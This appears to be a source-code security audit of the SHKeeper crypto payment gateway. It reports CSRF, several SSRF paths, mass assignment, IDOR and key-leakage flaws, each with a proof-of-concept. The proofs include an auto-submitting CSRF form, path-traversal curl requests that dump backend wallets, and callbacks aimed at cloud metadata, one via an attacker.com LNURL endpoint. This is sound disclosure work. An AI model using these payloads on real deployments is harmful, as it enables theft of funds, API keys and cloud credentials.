# Security Audit Report — SHKeeper

**Date:** 2026-02-23
**Scope:** Full source code review — code-level vulnerabilities only (not config/defaults)

---

## CRITICAL — CSRF → API Key Overwrite → Full Outsider Compromise

**Files:** `api_v1.py:217-224`, `auth.py:71-86`

**The Chain (zero credentials, pure outsider):**

1. `POST /<crypto>/payment-gateway/token` uses `@login_required` (session cookie) — NOT `@api_key_required`
2. Uses `request.get_json(force=True)` — parses JSON regardless of Content-Type header
3. Zero CSRF protection anywhere in the app (no Flask-WTF, no csrf_token in any form)
4. Sets API key for ALL wallets at once:

```python
# api_v1.py:217-224
@bp.post("/<crypto_name>/payment-gateway/token")
@login_required
def payment_gateway_set_token(crypto_name):
    req = request.get_json(force=True)      # parses text/plain as JSON
    for crypto in Crypto.instances.values():
        crypto.wallet.apikey = req["token"]  # ALL wallets overwritten
    db.session.commit()
```

**Attack:**

Outsider hosts this HTML. Admin visits while logged in:

```html
<form method="POST" enctype="text/plain"
  action="https://target/api/v1/BTC/payment-gateway/token">
  <input name='{"token":"ATTACKER_KEY","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

Browser sends: `{"token":"ATTACKER_KEY","x":"="}` with admin's session cookie.
`get_json(force=True)` parses it. ALL wallet API keys become `ATTACKER_KEY`.

**Post-exploitation** (attacker now has the API key):
- SSRF via payout path traversal (finding below)
- Trigger payouts to attacker addresses
- Create invoices with internal callback_url
- Read all wallet/invoice/transaction data
- All @api_key_required endpoints now accessible

**SameSite note:** Flask 2.2.2 may default session cookie to `SameSite=Lax`, which blocks cross-site POST cookies in modern browsers. However: (1) this is browser-side mitigation, not server-side fix, (2) any XSS on the same origin bypasses it, (3) the server has literally zero CSRF protection.

---

## CRITICAL — SSRF via Payout Destination Path Traversal

**Affects:** ALL non-BTC-like crypto backends (ETH, TRX, SOL, XRP, BNB, MATIC, AVAX, ARB, OP, LTC)

User-controlled `destination` from payout JSON body is injected directly into internal backend HTTP request URLs with zero sanitization.

**Chain:**

```
api_v1.py:402  →  req = request.get_json(force=True)
payout_service.py:58-59  →  crypto.mkpayout(req["destination"], ...)
ethereum.py:129  →  f"http://{self.gethost()}/{self.crypto}/payout/{destination}/{amount}"
```

Same pattern in: `tron_token.py:134`, `solana.py:34`, `xrp.py:36`, `bnb.py:34`, `polygon.py:34`, `avalanche.py:34`, `arbitrum.py:34`, `optimism.py:34`, `ltc.py:126`, `btc.py:128`

**Proof:**

```bash
curl -X POST http://target:5000/api/v1/ETH/payout \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{"destination":"../../dump","amount":"1","fee":"1"}'
```

This builds the internal URL:
```
http://ethereum-shkeeper:6000/ETH/payout/../../dump/1
```

Python `requests` normalizes this to:
```
http://ethereum-shkeeper:6000/dump/1
```

The request hits the `/dump` endpoint on the backend with the backend's auth credentials attached — dumps the wallet. Any backend endpoint is reachable via path traversal.

---

## CRITICAL — SSRF via Tron Multiserver server_id

**File:** `wallet.py:463` → `tron_token.py:162-165`

```python
# wallet.py:463 — server_id from query string, no validation
any_tron_crypto.multiserver_set_server(request.args["server_id"])

# tron_token.py:163 — injected into URL
f"http://{self.gethost()}/{self.crypto}/multiserver/change/{server_id}"
```

**Proof:**

```
POST /parts/tron-multiserver?server_id=../../dump
```

Normalizes to `http://tron-host:6000/dump` — hits arbitrary Tron backend endpoints.

---

## CRITICAL — SSRF via Tron Staking Parameters

**File:** `wallet.py:533-534` → `tron_token.py:197-200`

```python
# wallet.py:534 — both params from request.values (form/query), no validation
tron.stake_trx(request.values.get("amount_trx"), request.values.get("resource"))

# tron_token.py:198 — both injected into URL
f"http://{self.gethost()}/staking/freeze/{amount}/{resource}"
```

**Proof:**

```
POST /parts/tron-staking-stake
Content-Type: application/x-www-form-urlencoded

amount_trx=1&resource=../../dump
```

Normalizes to `http://tron-host:6000/dump` — backend wallet dump with service credentials.

---

## CRITICAL — SSRF via LNURL Callback (Bitcoin Lightning)

**File:** `bitcoin_lightning.py:710-712`

```python
callback_url = f"{lnurl_info['callback']}?amount={amount}"
lnurl_pr_info = requests.get(callback_url).json()
```

The `callback` field comes from the LNURL the user provides as payout destination. Attacker hosts a malicious LNURL-pay endpoint where `callback` points to an internal service.

**Proof:**

1. Attacker creates LNURL-pay endpoint at `attacker.com/.well-known/lnurlp/x` with:
   ```json
   {"callback": "http://169.254.169.254/latest/meta-data/", "minSendable": 1000, "maxSendable": 100000000}
   ```
2. Call estimate-tx-fee or payout with this LNURL as the address
3. Server GETs `http://169.254.169.254/latest/meta-data/?amount=1000`

Cloud metadata, internal services — all reachable. Uses raw `requests` (not the timeout-patched one from shkeeper), so it also hangs indefinitely on slow targets (DoS vector).

---

## CRITICAL — SSRF via Invoice callback_url + API Key Exfiltration

**File:** `callback.py:41-44, 118-121`

```python
r = requests.post(
    invoice.callback_url,          # user-controlled, stored at invoice creation
    json=notification,
    headers={"X-Shkeeper-Api-Key": apikey},  # wallet API key sent as header
)
```

The server POSTs to any URL the merchant specifies, AND attaches the wallet API key in the headers.

**Proof:**

```bash
curl -X POST http://target:5000/api/v1/BTC/payment_request \
  -H "X-Shkeeper-Api-Key: $KEY" \
  -d '{"external_id":"ssrf1","fiat":"USD","amount":100,"callback_url":"http://169.254.169.254/latest/meta-data/"}'
```

When payment arrives, the server POSTs to cloud metadata with the API key in headers. No host/IP validation exists.

---

## HIGH — Mass Assignment in Exchange Rate Update

**File:** `wallet.py:196-213`

```python
for k, v in request.form.items():
    if k.startswith("rates__"):
        _, symbol, field = k.split("__")
        rates[symbol][field] = v
# ...
ExchangeRate.query.filter_by(crypto=symbol, fiat=fiat).update(fields)
```

Any column on ExchangeRate is writable. The code only validates `rate`, `fee`, `fixed_fee` as Decimal. Everything else passes through raw.

**Proof:**

```
POST /rates/USD
Content-Type: application/x-www-form-urlencoded

rates__BTC__source=manual&rates__BTC__rate=1&rates__BTC__fee=0&rates__BTC__fee_policy=NO_FEE&rates__BTC__fiat=EUR
```

- `fee_policy=NO_FEE` → removes all processing fees (business logic bypass)
- `fiat=EUR` → corrupts the BTC/USD record to BTC/EUR, breaking USD invoice rate lookups (DoS)
- `crypto=DOGE` → rewrites which crypto this rate record applies to

These fields are NOT exposed in the UI — the UI only sends `source`, `rate`, `fee`, `fixed_fee`, `fee_policy`. The extra columns are injectable because there's no field whitelist.

---

## HIGH — Race Condition in Invoice Creation (TOCTOU)

**File:** `models.py:382-471`

```python
invoice = cls.query.filter_by(
    external_id=request["external_id"],
    callback_url=request["callback_url"],
    fiat=request["fiat"]
).first()
if invoice:
    # update existing
else:
    # create new — no DB lock, no unique constraint on these 3 fields
```

Two concurrent `payment_request` calls with identical `external_id` + `callback_url` + `fiat` can both see `invoice is None` and create two separate invoices with different crypto addresses.

**Impact:** Customer gets two valid payment addresses for the same order. Payments to either address are tracked independently. The merchant's system sees two callbacks for the same `external_id` — one may show PAID (triggering fulfillment) while the other is UNPAID. No unique DB constraint prevents this.

---

## HIGH — API Key Leaked in Application Logs

**File:** `callback.py:38, 114-115`

```python
app.logger.warning(
    f"[{utx.crypto}/{utx.txid}] Posting {notification} to {invoice.callback_url} with api key {apikey}"
)
```

The wallet API key is logged in plaintext on every callback send. Anyone with log access (log aggregation, container logs, `/var/log`) gets the API key.

---

## HIGH — IDOR in Payout Destination Delete

**File:** `api_v1.py:269-271`

```python
elif req["action"] == "delete":
    PayoutDestination.query.filter_by(addr=req["daddress"]).delete()
```

The route is `/<crypto_name>/payout_destinations` but the delete query only filters by `addr`, ignoring `crypto_name`. The model has `UniqueConstraint("crypto", "addr")`, meaning the same address CAN exist for different cryptos.

**Proof:**

```bash
curl -X POST http://target:5000/api/v1/BTC/payout_destinations \
  -d '{"action":"delete","daddress":"TSomeSharedAddr"}'
```

This deletes the payout destination for ALL cryptos that use this address, not just BTC.

---

## HIGH — Information Disclosure via Stack Traces

**File:** `api_v1.py` — 7 endpoints return `traceback.format_exc()` in responses

Lines: 133, 191, 508, 646, 679, 696, 748

```python
"traceback": traceback.format_exc(),
```

Exposes internal file paths, library versions, code logic, variable values to any API consumer.

---

## HIGH — Dynamic Model Attribute Filtering → Blind Data Enumeration

**File:** `wallet.py:396-399`

```python
for arg in request.args:
    if hasattr(Payout, arg):
        field = getattr(Payout, arg)
        query = query.filter(field.contains(request.args[arg]))
```

Any Payout model column is queryable via URL params. Unlike the Transaction filter (wallet.py:254 checks for `property`), the Payout filter has NO such check.

**Proof:**

```
GET /parts/payouts?callback_url=internal.corp.host
```

Returns matching payouts if any `callback_url` contains the probed string. Blind enumeration of `callback_url`, `external_id`, `dest_addr`, `task_id`, `error` fields.

Same pattern for Transaction at `wallet.py:251-259`.

---

## MEDIUM — Mass Assignment in BitcoinLightningInvoice.update()

**File:** `models.py:849-854`

```python
def update(self, **kwargs):
    for key, value in kwargs.items():
        if hasattr(self, key):
            setattr(self, key, value)
```

Called with full LND API response at `bitcoin_lightning.py:241, 265, 297`. If an LND response includes fields matching model columns (like `id`), they get overwritten via `setattr`. No field whitelist.
